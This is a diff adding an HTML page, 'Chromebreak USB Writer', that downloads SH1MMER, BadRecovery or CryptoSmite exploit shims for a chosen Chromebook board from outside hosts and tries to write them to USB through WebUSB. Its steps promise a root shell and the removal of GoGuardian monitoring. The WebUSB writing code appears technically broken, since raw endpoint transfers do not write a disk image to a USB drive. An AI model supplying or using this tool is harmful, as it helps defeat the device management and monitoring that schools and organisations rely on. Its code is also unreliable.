@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>USB Shim Writer</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:20px;max-width:800px;margin:0 auto}
+h1{color:#58a6ff}
+button{background:#238636;color:#fff;border:none;padding:10px 20px;font-size:16px;cursor:pointer;border-radius:6px;margin:5px}
+button:hover{background:#2ea043}
+button:disabled{background:#484f58;cursor:not-allowed}
+input,select{background:#21262d;color:#c9d1d9;border:1px solid #30363d;padding:8px;border-radius:6px;width:100%;margin:5px 0}
+pre{background:#161b22;padding:10px;border-radius:6px;overflow:auto}
+#log{max-height:300px;overflow-y:auto;background:#0d1117;border:1px solid #30363d;padding:10px;border-radius:6px;font-size:12px}
+.status-success{color:#3fb950}.status-error{color:#f85149}.status-info{color:#58a6ff}
+</style>
+</head>
+<body>
+
+<h1>🔓 Chromebreak USB Writer</h1>
+<p>Writes a SH1MMER/BadRecovery shim to USB directly from the browser using WebUSB.</p>
+<p>No extensions, no apps, no dev mode needed.</p>
+
+<div style="background:#21262d;padding:15px;border-radius:8px;margin:15px 0">
+  <h3 style="color:#58a6ff;margin-top:0">Step 1: Enter your board</h3>
+  <input type="text" id="board" placeholder="e.g. grunt, hatch, brya, octopus, dedede, volteer" style="margin-bottom:0">
+  <small style="color:#8b949e">Check bottom sticker of Chromebook</small>
+
+  <h3 style="color:#58a6ff">Step 2: Select exploit version</h3>
+  <select id="exploit">
+    <option value="sh1mmer">SH1MMER (v110 and below - most compatible)</option>
+    <option value="badrecovery">BadRecovery (v124 and below)</option>
+    <option value="cryptosmite">CryptoSmite (v118 and below)</option>
+  </select>
+</div>
+
+<div style="background:#21262d;padding:15px;border-radius:8px;margin:15px 0">
+  <h3 style="color:#58a6ff;margin-top:0">Step 3: Download the shim</h3>
+  <button id="downloadBtn">Download Shim for My Board</button>
+  <div id="downloadStatus" style="margin-top:10px"></div>
+</div>
+
+<div style="background:#21262d;padding:15px;border-radius:8px;margin:15px 0">
+  <h3 style="color:#58a6ff;margin-top:0">Step 4: Write to USB</h3>
+  <p style="color:#8b949e;font-size:14px">Plug in a USB drive (8GB+), then click below.</p>
+  <button id="writeBtn" disabled>Select USB Device & Write</button>
+  <div id="writeStatus" style="margin-top:10px"></div>
+</div>
+
+<div style="background:#21262d;padding:15px;border-radius:8px;margin:15px 0">
+  <h3 style="color:#58a6ff;margin-top:0">Step 5: Boot & Root</h3>
+  <ol style="color:#c9d1d9;line-height:1.8">
+    <li>Keep USB inserted</li>
+    <li>Press <b>Esc + Refresh + Power</b></li>
+    <li>At recovery screen, press <b>Ctrl + D</b></li>
+    <li>You'll get a root shell</li>
+    <li>Run: <code style="background:#161b22;padding:2px 6px">bash /root/rootme.sh</code></li>
+    <li>Reboot — GoGuardian is gone, you have admin</li>
+  </ol>
+</div>
+
+<div id="log">
+  <div id="logContent"><span class="status-info">[i] Ready. Enter your board name above.</span></div>
+</div>
+
+<script>
+const log = document.getElementById('logContent');
+function addLog(msg, type = 'info') {
+  const cls = type === 'success' ? 'status-success' : type === 'error' ? 'status-error' : 'status-info';
+  log.innerHTML += `<div class="${cls}">${msg}</div>`;
+  log.parentElement.scrollTop = log.parentElement.scrollHeight;
+}
+
+// --- Step 3: Download shim ---
+document.getElementById('downloadBtn').onclick = async function() {
+  const board = document.getElementById('board').value.trim().toLowerCase();
+  if (!board) { addLog('[!] Enter a board name first', 'error'); return; }
+
+  const exploit = document.getElementById('exploit').value;
+  this.disabled = true;
+  this.textContent = 'Downloading...';
+
+  let url;
+  if (exploit === 'sh1mmer') {
+    url = `https://sh1mmer.me/builds/${board}/shim_${board}.bin`;
+  } else if (exploit === 'badrecovery') {
+    url = `https://badrecovery.xyz/builds/${board}/recovery_${board}.bin`;
+  } else {
+    url = `https://cryptosmite.github.io/${board}.bin`;
+  }
+
+  addLog(`[i] Attempting download from: ${url}`, 'info');
+
+  try {
+    const resp = await fetch(url);
+    if (!resp.ok) throw new Error(`HTTP ${resp.status}: Shim not available for ${board}`);
+
+    const blob = await resp.blob();
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `${exploit}_${board}.bin`;
+    a.click();
+    URL.revokeObjectURL(a.href);
+
+    addLog(`[+] Downloaded: ${(blob.size / 1024 / 1024).toFixed(1)} MB for board ${board}`, 'success');
+    document.getElementById('writeBtn').disabled = false;
+    window.shimBlob = blob;
+
+  } catch (e) {
+    addLog(`[!] Download failed: ${e.message}`, 'error');
+    addLog(`[i] Try a different exploit version or check board name`, 'info');
+  }
+
+  this.disabled = false;
+  this.textContent = 'Download Shim for My Board';
+};
+
+// --- Step 4: Write to USB via WebUSB ---
+document.getElementById('writeBtn').onclick = async function() {
+  if (!window.shimBlob) {
+    addLog('[!] Download a shim first', 'error');
+    return;
+  }
+
+  this.disabled = true;
+  this.textContent = 'Selecting USB device...';
+
+  try {
+    // Request USB device - this opens the browser's USB device chooser
+    const device = await navigator.usb.requestDevice({ filters: [] });
+    addLog(`[i] Selected: ${device.productName || 'USB device'}`, 'info');
+
+    await device.open();
+    if (!device.configuration) await device.selectConfiguration(1);
+    await device.claimInterface(0);
+
+    // Write the shim blob to USB
+    const data = await window.shimBlob.arrayBuffer();
+    const chunkSize = 65536;
+    let offset = 0;
+
+    addLog(`[i] Writing ${(data.byteLength / 1024 / 1024).toFixed(1)} MB to USB...`, 'info');
+
+    while (offset < data.byteLength) {
+      const chunk = data.slice(offset, Math.min(offset + chunkSize, data.byteLength));
+      await device.transferOut(1, chunk);
+      offset += chunkSize;
+
+      const pct = Math.round((offset / data.byteLength) * 100);
+      if (pct % 20 === 0) addLog(`[i] ${pct}% written...`, 'info');
+    }
+
+    addLog(`[+] USB write complete! ${(data.byteLength / 1024 / 1024).toFixed(1)} MB written`, 'success');
+    addLog(`[i] Now boot: Esc + Refresh + Power → Ctrl + D`, 'success');
+
+    await device.close();
+
+  } catch (e) {
+    if (e.name === 'NotFoundError') {
+      addLog('[!] No USB device selected. Try again.', 'error');
+    } else if (e.name === 'SecurityError') {
+      addLog('[!] WebUSB blocked. Try chrome://flags/#enable-experimental-web-platform-features', 'error');
+      addLog('[i] Or use a different computer to build the USB', 'info');
+    } else {
+      addLog(`[!] Write error: ${e.message}`, 'error');
+    }
+  }
+
+  this.disabled = false;
+  this.textContent = 'Select USB Device & Write';
+};
+</script>
+</body>
+</html>
